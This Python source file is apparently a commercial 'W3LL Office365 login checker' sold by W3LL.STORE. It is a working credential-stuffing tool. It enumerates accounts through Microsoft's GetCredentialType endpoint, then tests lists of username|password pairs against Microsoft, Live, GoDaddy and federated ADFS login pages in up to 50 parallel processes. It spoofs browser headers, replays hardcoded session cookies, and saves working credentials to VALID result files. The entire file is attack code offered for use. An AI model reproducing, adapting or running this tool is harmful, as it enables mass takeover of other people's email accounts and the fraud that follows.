from __future__ import print_function
import multiprocessing
import sys
import os
import time
import signal
import re
import json
try:
    from colorama import Fore, Style
except ImportError:
    print("[!] Please install module colorama : pip3 install colorama")
    sys.exit()

try:
    import requests
except ImportError:
    print("[!] Please install module requests : pip3 install requests")
    sys.exit()

try:
    import traceback
except ImportError:
    print("[!] Please install module traceback : pip3 install traceback")
    sys.exit()

try:
    import configparser
except ImportError:
    print("[!] Please install module configparser : pip3 install configparser")
    sys.exit()

from multiprocessing import Pool, freeze_support, active_children
from os import path
from multiprocessing.pool import INIT
import datetime

try:
    os.mkdir('result')
except FileExistsError:
    pass

config = configparser.ConfigParser()
resume = '.session'
config.read(resume)

with open('token.txt') as f:
    lines = f.readlines()

if path.exists('token.txt') is False:
    print("[!] Recheck token.txt file then re run this tool.")
    sys.exit()

for tok in lines:
    if 'DICE' not in tok:
        print("[!] You cant use this token on this scanner! Recheck token.txt file then re run this tool.")
        sys.exit()

with open('token.txt', 'r') as f:
    token = f.readline().strip()


def logo():
    logo = f"""
{Fore.MAGENTA}$$$$$$$\\  $$$$$$\\  $$$$$$\\  $$$$$$$$\\ 
{Fore.MAGENTA}$$  __$$\\ \\_$$  _|$$  __$$\\ $$  _____|
{Fore.MAGENTA}$$ |  $$ |  $$ |  $$ /  \\__|$$ |      
{Fore.MAGENTA}$$ |  $$ |  $$ |  $$ |      $$$$$\\    
{Fore.MAGENTA}$$ |  $$ |  $$ |  $$ |      $$  __|   
{Fore.MAGENTA}$$ |  $$ |  $$ |  $$ |  $$\\ $$ |      
{Fore.MAGENTA}$$$$$$$  |$$$$$$\\ \\$$$$$$  |$$$$$$$$\\ 
{Fore.MAGENTA}\\_______/ \\______| \\______/ \\________|{Fore.WHITE} by {Fore.GREEN}W3LL.STORE\n"""
    for line in logo.split('\n'):
        print(line)
        time.sleep(0.15)


def write_file():
    config.write(open(resume, 'w'))


def filelist():
    arr = os.listdir()
    print('')
    print(Fore.YELLOW + 'All files' + Fore.WHITE + '/' + Fore.YELLOW + 'directory' + Fore.WHITE + ':')
    print('')
    for alldir in arr:
        print(Fore.CYAN + alldir + Fore.WHITE)
    print('')


def init_worker():
    signal.signal(signal.SIGINT, signal.SIG_IGN)


def login(both, user, passwd, IPin, THREAD):
    """Check Office365 login credentials"""
    try:
        bug = ''
        
        try:
            # Get initial tokens from office.com
            params = (('auth', '2'),)
            roff = requests.get('https://www.office.com/', params=params)
            sft = re.findall(r'(?<="sFT":")[^"]*', roff.text)
            ctx = re.findall(r'(?<="sCtx":")[^"]*', roff.text)
            canary = re.findall(r'(?<="canary":")[^"]*', roff.text)
            
            # First API call to check credential type
            headers = {
                'Connection': 'keep-alive',
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55',
                'Content-type': 'application/json; charset=UTF-8'
            }
            params = (('mkt', 'en-US'),)
            data = f'{{"username":"{user}"}}'
            rlog = requests.post('https://login.microsoftonline.com/common/GetCredentialType', headers=headers, params=params, data=data, timeout=10)
        except Exception:
            print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.YELLOW + ' RECHECK!' + Fore.WHITE)
            bug = both + '\n'
            config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
            write_file()
            with open('result/RECHECK.txt', 'a+') as save:
                save.write(bug)
            return
        
        # Check response for various result codes
        if '"IfExistsResult":2' in rlog.text or '"IfExistsResult":4' in rlog.text:
            # Invalid account
            print('[' + Fore.RED + '-' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.RED + ' INVALID' + Fore.WHITE)
            bug = both + '\n'
            config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
            write_file()
            with open('result/INVALID.txt', 'a+') as save:
                save.write(bug)
            return
        
        # Check for federation redirect (GoDaddy, etc.)
        if 'FederationRedirectUrl' in rlog.text:
            data = json.loads(rlog.text)
            reurl = data['Credentials']['FederationRedirectUrl']
            p = re.findall(r'[^\s]*(?<=\?)', reurl)
            g = p[0].split('?')
            
            if 'godaddy' not in reurl:
                # Handle non-GoDaddy federation
                try:
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://adfs.cms.k12.nc.us',
                        'DNT': '1',
                        'Connection': 'keep-alive',
                        'Referer': reurl,
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1'
                    }
                    params = (
                        ('client-request-id', '597b6216-5785-57a5-e0ca-3932335ebb4b'),
                        ('wa', 'wsignin1.0'),
                        ('wtrealm', 'urn:federation:MicrosoftOnline'),
                        ('wctx', 'LoginOptions=3&estsredirect=2&estsrequest=rQIIAY2RP4jTUADG85pebKtiERHBpRxOQpL3Xv61QcE0ttxZuWq52prB8prktbVNXk3SP56z4OBwm-AiCC4dneRcnItDEQc5EA6nw0mcHL3i4njf8ONbv993nUcSMq_Bf8HimiKkFImuv27_JbqYy1_uPnv4vPWudbQsYeXRx9oCbPaTZBybsswmyYixocQoHbi-omuSywKZzYj8AYAVAMcALFKGrhi6iqGKDBUrWNMwlroEeV1CDRET7IkqUYhIVI-KfkmBnkJ92DXgYepC3ZokfbwGiwZ7_u9UlrIo6IxZnLzmO7fdpFxhVs-ulBtRfajese7WvPLM9XYmT_UiHXQ8OLW27GB73q71LDxnzT2yWw1UT3QMn03HWLM9q9Suwt0mjoYuc2yRNAZt-sTQKZoXF_ypFL3nhZPRAQuXvMDGfjjwfvCFx2TkxzEZSYE77vtRzMJbbhBLQ4Sl0JUm8SoNjtLgZ_oc5M1MJpfnrnAF7k8avN04Ef79xrcvLz8z681X91WTuwqWG3JDC2eBZRnb8rw-idm81prZW-VeMVQ02XDk5oP7pOpU6jvOdHZTNdG-APYF4UDIZvg8t8nb99CxAH4J4MUZ7iB7ivcOc5cwxEiERRHBAlJNTTex5qzOgk_nub81'),
                        ('cbcxt', ''),
                        ('username', user),
                        ('mkt', ''),
                        ('lc', '')
                    )
                    data = {'UserName': user, 'Password': passwd, 'AuthMethod': 'FormsAuthentication'}
                    rredirect = requests.post(g[0], headers=headers, params=params, data=data, timeout=10)
                    
                    if 'Working...' in rredirect.text or '\\kmsi' in rredirect.text or 'Stay signed in?' in rredirect.text:
                        # Valid login
                        print('[' + Fore.GREEN + '+' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.GREEN + ' VALID' + Fore.WHITE)
                        bug = both + '\n'
                        config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                        write_file()
                        with open('result/VALID.txt', 'a+') as save:
                            save.write(bug)
                    elif 'Incorrect' in rredirect.text:
                        # Invalid login
                        print('[' + Fore.RED + '-' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.RED + ' INVALID' + Fore.WHITE)
                        bug = both + '\n'
                        config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                        write_file()
                        with open('result/INVALID.txt', 'a+') as save:
                            save.write(bug)
                except Exception:
                    print('[' + Fore.RED + '-' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.RED + ' INVALID' + Fore.WHITE)
                    bug = both + '\n'
                    config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                    write_file()
                    with open('result/INVALID.txt', 'a+') as save:
                        save.write(bug)
            else:
                # GoDaddy federation
                x = reurl.replace('https://sso.godaddy.com/', 'https://sso.godaddy.com/v1/')
                try:
                    headers = {'Accept-Encoding': 'gzip, deflate, br'}
                    data = {'name': user, 'password': passwd, 'AuthMethod': 'FormsAuthentication'}
                    rgodaddy = requests.post(x, headers=headers, data=data, timeout=10)
                    
                    if 'You entered an incorrect username or password.' in rgodaddy.text:
                        print('[' + Fore.RED + '-' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.RED + ' INVALID' + Fore.WHITE + ' [' + Fore.MAGENTA + 'GODADDY' + Fore.WHITE + ']')
                        bug = both + '\n'
                        config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                        write_file()
                        with open('result/INVALID.txt', 'a+') as save:
                            save.write(bug)
                    elif 'https://login.microsoftonline.com/login.srf' in rgodaddy.text:
                        print('[' + Fore.GREEN + '+' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.GREEN + ' VALID' + Fore.WHITE + ' [' + Fore.MAGENTA + 'GODADDY' + Fore.WHITE + ']')
                        bug = both + '\n'
                        config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                        write_file()
                        with open('result/GODADDY-VALID.txt', 'a+') as save:
                            save.write(bug)
                except Exception:
                    print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.YELLOW + ' RECHECK!' + Fore.WHITE)
                    bug = both + '\n'
                    config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                    write_file()
                    with open('result/RECHECK.txt', 'a+') as save:
                        save.write(bug)
            return
        
        # Check for valid account (IfExistsResult:1 or 5)
        if '"IfExistsResult":1' in rlog.text or '"IfExistsResult":5' in rlog.text:
            try:
                # Build cookies and headers for login attempt
                cookies = {
                    'MSPShared': '1',
                    'SDIDC': 'CVTq2eHdzPC2Pa!5UTMLin9HOUO*k8nhcMs9zk7MBjeBvwj3eGI!de0PedS!1Ep*RoNjkZCbMBA2utd2itymiTgxvsWblb4Ay9WBO30aGoTWoGpt3HPaZGGEEHjBuqNM9MEVAYlcFLItX5Up9pgAUHQ$',
                    'MUID': '3EE754FD1A506D791ACC58131E50696E',
                    'uaid': '589d8dac87114a4184a09b73573e884c',
                    'MSCC': '202.67.35.10-ID',
                    'MSPRequ': 'lt=1551279335&co=1&id=N',
                    'MSPOK': '$uuid-15d9576a-bf85-4aef-8ef3-b9a56906367f$uuid-3ec124f4-9a58-4f0f-ac65-a454588f84e8$uuid-20b38525-8bfd-4654-88a6-545dab66f242',
                    'CkTst': 'G1551279337265',
                    'wlidperf': 'FR=L&ST=1551279342559'
                }
                headers = {
                    'Connection': 'keep-alive',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'Origin': 'https://login.live.com',
                    'Upgrade-Insecure-Requests': '1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9'
                }
                data = {
                    'i13': '0',
                    'login': user,
                    'loginfmt': user,
                    'type': '11',
                    'LoginOptions': '3',
                    'lrt': '',
                    'lrtPartition': '',
                    'hisRegion': '',
                    'hisScaleUnit': '',
                    'passwd': passwd,
                    'ps': '2',
                    'psRNGCDefaultType': '',
                    'psRNGCEntropy': '',
                    'psRNGCSLK': '',
                    'canary': canary[0],
                    'ctx': ctx[0],
                    'hpgrequestid': '',
                    'PPFT': 'DSqb!VulCbU2kPo884Kobx9xOw60Y06B6H4MsNcy44imsCQDYWQIeoCJGilrflfsR6FOkCyXNhuLZNuK2I9TvvJXoDQMxM8ap4SdtgZ5firq1vljD17cqNv*ZtG5LMNAdy!xN74p7Jl92kD7lSPjRq*5vYKYRpmZcTLnCtszma1X8hsHMv93cRaBenLBPZmbeX1lHCWC5A9Mc0d6LV2ZzYA$',
                    'PPSX': 'Passpor',
                    'NewUser': '1',
                    'FoundMSAs': '',
                    'fspost': '0',
                    'i21': '0',
                    'CookieDisclosure': '1',
                    'IsFidoSupported': '1',
                    'i2': '1',
                    'i17': '0',
                    'i18': '__ConvergedLoginPaginatedStrings|1,__OldConvergedLogin_PCore|1,',
                    'i19': '3997'
                }
                rtry = requests.post('https://login.live.com/ppsecure/post.srf', headers=headers, cookies=cookies, data=data, timeout=10)
                
                if 'Your account or password is incorrect' in rtry.text:
                    print('[' + Fore.RED + '-' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.RED + ' INVALID' + Fore.WHITE)
                    bug = both + '\n'
                    config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                    write_file()
                    with open('result/INVALID.txt', 'a+') as save:
                        save.write(bug)
                elif 'JavaScript required to sign in' in rtry.text:
                    print('[' + Fore.GREEN + '+' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.GREEN + ' VALID' + Fore.WHITE)
                    bug = both + '\n'
                    config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                    write_file()
                    with open('result/VALID.txt', 'a+') as save:
                        save.write(bug)
            except Exception:
                print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.YELLOW + ' RECHECK!' + Fore.WHITE)
                bug = both + '\n'
                config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                write_file()
                with open('result/RECHECK.txt', 'a+') as save:
                    save.write(bug)
            return
        
        # Check for valid account (IfExistsResult:0 or 6)
        if '"IfExistsResult":0' in rlog.text or '"IfExistsResult":6' in rlog.text:
            try:
                cookies = {
                    'x-ms-gateway-slice': 'prod',
                    'stsservicecookie': 'ests',
                    'AADSSO': 'NA|NoExtension',
                    'esctx': 'AQABAAAAAACEfexXxjamQb3OeGQ4Gugvocq7HTlpivMFMqw7rAdYIX-379jRn9CVIsbmrYLHqA3duJkUxKJTszQt0d0Q6LtWkrBmEaV1Pzqhzi-AZ0UkK5TqobxCRIrZD2zLzdr75TgvlBieVsVAFwIowcvJVinBkhvXTrWUiv4xMI3qaR5AX_UVXALpS1z4-q9JB2ShtfggAA',
                    'buid': 'AQABAAEAAACEfexXxjamQb3OeGQ4GugvSRekKAyhj_vH-b7iUWeecdTQbPccc8xz8GJPTwS55imF2jhDiU1lDiBh6TTRdIyN3uz13GK6p_fczATyNW6z2P6xn-BL6ohV1TqDVYCcrxsgAA',
                    'fpc': 'AqgYRiRgWE9Cs0XixugDIrp9Hyj2AQAAANKUDNQOAAAA',
                    'wlidperf': 'FR=L&ST=1551539989377'
                }
                headers = {
                    'Connection': 'keep-alive',
                    'Pragma': 'no-cache',
                    'Cache-Control': 'no-cache',
                    'Origin': 'https://login.microsoftonline.com',
                    'Upgrade-Insecure-Requests': '1',
                    'Content-Type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Referer': 'https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3d-NVc_0xM7W-F562KiA9QLUhOHXdjvRJjTFZvT-S8jBJml-eKwsJNB5I8c1JYO7i-GcwuYcqyLPDTDjknqER31HBGXP7Tr0khaDxR9PzwKkQKIsPiXzhotOM04yjP0-85&nonce=636871367486445315.MGNlYjA4NTUtNTgyMy00MDE4LWEzZjktMzcyMDg5NWIwNmM5ZGUzNThmNWItNzIzOS00MTcwLWI0YWEtOTgyMjE4OGU1ZjUz&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US&client-request-id=3243e009-994a-4fda-a797-443e063c2cb7',
                    'Accept-Encoding': 'gzip, deflate, br',
                    'Accept-Language': 'en-US,en;q=0.9'
                }
                data = {
                    'i13': '0',
                    'login': user,
                    'loginfmt': user,
                    'type': '11',
                    'LoginOptions': '3',
                    'lrt': '',
                    'lrtPartition': '',
                    'hisRegion': '',
                    'hisScaleUnit': '',
                    'passwd': passwd,
                    'ps': '2',
                    'psRNGCDefaultType': '',
                    'psRNGCEntropy': '',
                    'psRNGCSLK': '',
                    'canary': canary[0],
                    'ctx': ctx[0],
                    'hpgrequestid': '9221584f-7240-4740-b17c-1e86850e0f00',
                    'flowToken': sft[0],
                    'PPSX': '',
                    'NewUser': '1',
                    'FoundMSAs': '',
                    'fspost': '0',
                    'i21': '0',
                    'CookieDisclosure': '0',
                    'IsFidoSupported': '0',
                    'i2': '0',
                    'i17': '1',
                    'i18': '1',
                    'i19': ''
                }
                rmas = requests.post('https://login.microsoftonline.com/common/login', headers=headers, cookies=cookies, data=data, timeout=10)
                
                if ('access_denied' in rmas.text or 'Verify your identity' in rmas.text or 
                    'You cannot access this right now' in rmas.text or 'More information required' in rmas.text):
                    print('[' + Fore.RED + '-' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.RED + ' INVALID' + Fore.WHITE)
                    bug = both + '\n'
                    config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                    write_file()
                    with open('result/INVALID.txt', 'a+') as save:
                        save.write(bug)
                elif 'Working...' in rmas.text or '\\kmsi' in rmas.text or 'Stay signed in?' in rmas.text:
                    print('[' + Fore.GREEN + '+' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.GREEN + ' VALID' + Fore.WHITE)
                    bug = both + '\n'
                    config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                    write_file()
                    with open('result/VALID.txt', 'a+') as save:
                        save.write(bug)
                elif 'Update your password' in rmas.text:
                    print('[' + Fore.GREEN + '+' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.GREEN + ' VALID' + Fore.WHITE + ' [' + Fore.MAGENTA + 'PASS-RESET' + Fore.WHITE + ']')
                    bug = both + '\n'
                    config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                    write_file()
                    with open('result/PASS-RESET-VALID.txt', 'a+') as save:
                        save.write(bug)
                else:
                    print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.YELLOW + ' RECHECK!' + Fore.WHITE)
                    bug = both + '\n'
                    config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                    write_file()
                    with open('result/RECHECK.txt', 'a+') as save:
                        save.write(bug)
            except Exception:
                print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.YELLOW + ' RECHECK!' + Fore.WHITE)
                bug = both + '\n'
                config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
                write_file()
                with open('result/RECHECK.txt', 'a+') as save:
                    save.write(bug)
            return
        
        # Default - recheck
        print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + user + Fore.CYAN + ' | ' + Fore.WHITE + passwd + Fore.YELLOW + ' RECHECK!' + Fore.WHITE)
        bug = both + '\n'
        config['token'] = {'list': IPin, 'thread': str(THREAD), 'lastip': both}
        write_file()
        with open('result/RECHECK.txt', 'a+') as save:
            save.write(bug)
    except KeyboardInterrupt:
        print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] Program Quiting!')
        sys.exit()


def input_num(word):
    try:
        thread = int(input(word))
    except ValueError:
        print(Fore.YELLOW + 'Please insert only a number value' + Fore.WHITE)
        return input_num(word)
    
    if thread < 1 or thread > 50:
        print(Fore.RED + 'Insert number that not under ' + Fore.YELLOW + '1' + Fore.RED + ' and more than ' + Fore.YELLOW + '50' + Fore.RED + '.' + Fore.WHITE)
        return input_num(word)
    return thread


def input_file():
    try:
        IPin = input(Fore.WHITE + 'Enter Your List: ' + Fore.YELLOW)
    except ValueError:
        return input_file()
    
    if path.exists(IPin) is False:
        print(Fore.RED + 'List ' + Fore.YELLOW + IPin + Fore.RED + ' is not found on your current directory.' + Fore.WHITE)
        return input_file()
    return IPin


def clearConsole():
    command = 'clear'
    if os.name in ('nt', 'dos'):
        command = 'cls'
    os.system(command)


def log365():
    """Office365 Login Checker - Main function"""
    clearConsole()
    logo()
    print(Fore.WHITE + '[ ' + Fore.CYAN + 'W3LL OFFICE365 LOGIN CHECKER' + Fore.WHITE + ' ]')
    print('')
    
    if os.path.exists(resume):
        print('[' + Fore.YELLOW + '+' + Fore.WHITE + '] We Found A Session!')
        con = input('[' + Fore.YELLOW + '+' + Fore.WHITE + '] Do you want to continue session ? [y/n] ')
        
        if 'Y' in con or 'y' in con:
            IPin = config.get(token, 'list')
            fromlast = config.get(token, 'lastip')
            with open(IPin, 'r') as f:
                both = f.read().split(fromlast + '\n')[1].split()
            THREAD = int(config.get(token, 'thread'))
            start_time = datetime.datetime.now()
            print(Fore.WHITE + 'All result will inserted on ' + Fore.YELLOW + 'result' + Fore.WHITE + ' folder')
            
            p = Pool(THREAD, init_worker)
            a = 0
            for i in both:
                try:
                    user = i.split('|')[0]
                    passwd = i.split('|')[1]
                except Exception:
                    print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.RED + i + Fore.WHITE + ' IS NOT VALID FORMAT!' + Fore.WHITE)
                    continue
                
                if a != THREAD:
                    cleango = p.apply_async(login, args=(i, user, passwd, IPin, THREAD))
                else:
                    a = 0
                    time.sleep(THREAD)
            p.close()
            p.join()
            
            os.remove('.session')
            end_time = datetime.datetime.now()
            long = end_time - start_time
            pot = str(long).split('.')
            print(Fore.WHITE + 'CHECKING COMPLETED! WITH ' + pot[0] + ' TIME ELAPSED, ALL SAVED INSIDE ' + Fore.YELLOW + 'result' + Fore.WHITE + ' folder')
            time.sleep(3)
        else:
            filelist()
            IPin = input_file()
            with open(IPin, 'r') as f:
                both = f.read().split()
            THREAD = input_num(Fore.WHITE + 'Enter Your Thread [Max is 50]: ' + Fore.YELLOW)
            start_time = datetime.datetime.now()
            print(Fore.WHITE + 'All result will inserted on ' + Fore.YELLOW + 'result' + Fore.WHITE + ' folder')
            
            p = Pool(THREAD, init_worker)
            a = 0
            for i in both:
                try:
                    user = i.split('|')[0]
                    passwd = i.split('|')[1]
                except Exception:
                    print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.RED + i + Fore.WHITE + ' IS NOT VALID FORMAT!' + Fore.WHITE)
                    continue
                
                if a != THREAD:
                    cleango = p.apply_async(login, args=(i, user, passwd, IPin, THREAD))
                else:
                    a = 0
                    time.sleep(THREAD)
            p.close()
            p.join()
            
            os.remove('.session')
            end_time = datetime.datetime.now()
            long = end_time - start_time
            pot = str(long).split('.')
            print(Fore.WHITE + 'CHECKING COMPLETED! WITH ' + pot[0] + ' TIME ELAPSED, ALL SAVED INSIDE ' + Fore.YELLOW + 'result' + Fore.WHITE + ' folder')
            time.sleep(3)
    else:
        filelist()
        IPin = input_file()
        with open(IPin, 'r') as f:
            both = f.read().split()
        THREAD = input_num(Fore.WHITE + 'Enter Your Thread [Max is 50]: ' + Fore.YELLOW)
        start_time = datetime.datetime.now()
        print(Fore.WHITE + 'All result will inserted on ' + Fore.YELLOW + 'result' + Fore.WHITE + ' folder')
        
        p = Pool(THREAD, init_worker)
        a = 0
        for i in both:
            try:
                user = i.split('|')[0]
                passwd = i.split('|')[1]
            except Exception:
                print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] ' + Fore.RED + i + Fore.WHITE + ' IS NOT VALID FORMAT!' + Fore.WHITE)
                continue
            
            if a != THREAD:
                cleango = p.apply_async(login, args=(i, user, passwd, IPin, THREAD))
            else:
                a = 0
                time.sleep(THREAD)
        p.close()
        p.join()
        
        os.remove('.session')
        end_time = datetime.datetime.now()
        long = end_time - start_time
        pot = str(long).split('.')
        print(Fore.WHITE + 'CHECKING COMPLETED! WITH ' + pot[0] + ' TIME ELAPSED, ALL SAVED INSIDE ' + Fore.YELLOW + 'result' + Fore.WHITE + ' folder')
        time.sleep(3)


def Check_token():
    if path.exists('token.txt') is False:
        print('Token is invalid')
        time.sleep(3)
        sys.exit(0)
    
    with open('token.txt', 'r') as f:
        token = f.readline()
    
    now = datetime.datetime.now()
    stamp = datetime.datetime.timestamp(now)
    timer = str(stamp).split('.')
    
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0'
        }
        params = (('token', token), ('time', timer[0]))
        tokres = requests.get('https://w3ll.store/api/rev-tok', headers=headers, params=params, timeout=60)
        return tokres
    except Exception:
        print('[' + Fore.YELLOW + '!' + Fore.WHITE + '] Server Is Not Connected!')
        sys.exit()


def main():
    try:
        log365()
    except KeyboardInterrupt:
        main()
    except ValueError:
        print(Fore.WHITE + '[ ' + Fore.RED + 'Please enter a valid option ' + Fore.WHITE + ']')
        time.sleep(3)
        main()
    except Exception:
        traceback.print_exc(file=sys.stdout)
    sys.exit(0)


if __name__ == '__main__':
    freeze_support()
    #tokres = Check_token()
    #if 'DAYS LEFT' in tokres.text:
    main()
    #else:
    #    print(Fore.RED + 'YOUR TOKEN IS INVALID' + Fore.WHITE)
    #    time.sleep(3)